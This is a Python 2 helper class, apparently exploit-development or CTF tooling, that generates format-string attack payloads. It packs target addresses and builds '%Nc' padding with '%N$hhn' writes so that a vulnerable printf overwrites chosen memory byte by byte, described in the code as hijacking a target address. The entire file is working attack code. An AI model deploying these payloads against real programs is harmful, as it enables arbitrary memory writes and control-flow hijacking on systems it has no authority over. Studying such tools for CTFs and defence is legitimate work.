import struct

p32 = lambda x : struct.pack('<L', x)
p64 = lambda x : struct.pack('<Q', x)
get_byte = lambda x : (x[0], x[1] & 0xff)

class FormatStringExploit:
    printed = 0
    table = {
            32 : [p32, 4],
            64 : [p64, 6]
            }

    def __init__(self, printed=0, hij_tar=None, hij_val=None):
        self.hijack_target = hij_tar
        self.hijack_address = hij_val
        FormatStringExploit.printed += printed
        
    def value_setup(self, size=4):
        '''Arrange size of value per byte for optimization'''
        val = [(self.hijack_target + i, self.hijack_address >> 8 * i) for i in xrange(size)]
        return sorted(map(get_byte, val), key=lambda x : (x[1] - 16) & 0xff)

    @staticmethod
    def sort_multi_target(val):
        '''This is for hijack multiple target once'''
        '''Sort it by the value we want to change, so that it will be more efficient'''
        return sorted(val, key=lambda x : x[1])
        
    @classmethod
    def generate_target(cls, val, bits):
        payload = ''.join(cls.table[bits][0](i[0]) for i in val)
        cls.printed += cls.table[bits][1] * len(val)
        return payload

    @classmethod
    def generate_fmt(cls, val, offset):
        val = map(lambda x : x[1], val)
        payload = ''
        for idx, byte in enumerate(val):
            pad = ((byte - cls.printed) % 256 + 256) % 256
            if pad > 0:
                payload += "%{}c".format(pad)
            payload += "%{}$hhn".format(offset + idx)
            cls.printed += pad
        return payload

    def generate32(self, off):
        '''For simplest usage of formatstring'''
        val = self.value_setup()
        payload = FormatStringExploit.generate_target(val, 32)
        payload += FormatStringExploit.generate_fmt(val, off)
        return payload

    @classmethod
    def size(cls):
        '''Return already printed words'''
        return cls.printed
